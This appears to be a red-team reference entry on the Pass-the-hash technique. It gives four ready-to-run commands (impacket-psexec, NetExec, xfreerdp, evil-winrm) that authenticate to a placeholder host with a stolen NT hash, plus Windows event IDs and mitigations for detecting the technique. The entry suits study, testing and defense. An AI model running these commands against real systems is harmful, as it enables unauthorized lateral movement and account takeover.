---
id: pth
type: technique
label: "Pass-the-hash"
phase: "lateral"
tools: ["impacket", "netexec", "crackmapexec"]
cve: null
detect: "4624 type 3 with NTLMSSP and no matching interactive logon."
mitre: "T1550.002"
tag: null
---


# Pass-the-hash

### Affected object / attribute
**NTLM authentication** — the NT hash is the credential.

### Concept (deep)
NTLM auth accepts the **NT hash** directly — no cracking needed. Works where NTLM is allowed; blocked by Kerberos-only or `RestrictNTLM`.

### Commands
```bash
# ── psexec PTH ──────────────────────────────────────────────────────
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<nt> \
  corp.local/admin@10.10.10.5

# ── NetExec validate ────────────────────────────────────────────────
nxc smb 10.10.10.5 -u administrator -H <nt>

# ── RDP PTH ──────────────────────────────────────────────────────────
xfreerdp /v:10.10.10.5 /u:admin /pth:<nt> /cert-ignore

# ── WinRM PTH ────────────────────────────────────────────────────────
evil-winrm -i 10.10.10.5 -u admin -H <nt>
```

### Detection
**4624 type 3** with NTLMSSP for accounts that normally use Kerberos; **4776**; `RestrictNTLM` + Credential Guard.

---
